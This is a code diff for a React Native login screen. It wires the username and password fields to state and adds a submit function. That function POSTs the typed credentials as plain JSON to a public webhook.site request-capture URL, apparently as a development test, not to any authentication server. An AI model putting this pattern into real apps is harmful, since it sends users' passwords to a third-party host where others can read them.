@@ -1,7 +1,10 @@
-import React from 'react';
+import React, {useState} from 'react';
 import { StyleSheet, Text, View, Button, Alert, TextInput} from 'react-native';
 
-export default LoginScreen = () => {
+export default function LoginScreen() {
+  const [username, setUsername] = useState('username');
+  const [password, setPassword] = useState('password');
+
   return (
     <View style={styles.container}>
       <View>
@@ -10,19 +13,21 @@ export default LoginScreen = () => {
       <View style={styles.inputView}>
         <TextInput
             style={styles.inputWide}
-            placeholder=" Username"
+            placeholder=" Username *Case-sensitive"
+            onChangeText={(val) => setUsername(val)}
             keyboardType="default"
         />
         <TextInput
             style={styles.inputWide}
             placeholder=" Password"
+            onChangeText={(val) => setPassword(val)}
             keyboardType="default"
             secureTextEntry={true}
         />
       </View>
       <View style={styles.buttonView}>
         <Button
-          onPress={() => Alert.alert('Cannot Log in at this time')}
+          onPress={SubmittLogin}
           title="LogIn"
           color="#f194ff"
           accessibilityLabel="Log In button"
@@ -31,6 +36,28 @@ export default LoginScreen = () => {
     </View>
 
   );
+
+  async function SubmittLogin(){
+    try {
+
+      await fetch('https://webhook.site/3d0ffd20-2ba3-4b89-92cd-dc40d6eac827', {
+        method:'post',
+        mode:'no-cors',
+        headers: {
+          'Accept':'application/json',
+          'Content-Type':'application/json'
+        },
+        body: JSON.stringify({
+          username: username,
+          password : password,
+        })
+      });
+
+    } catch (e) {
+      console.log(e);
+    }
+  }
+
 }
 
 const styles = StyleSheet.create({
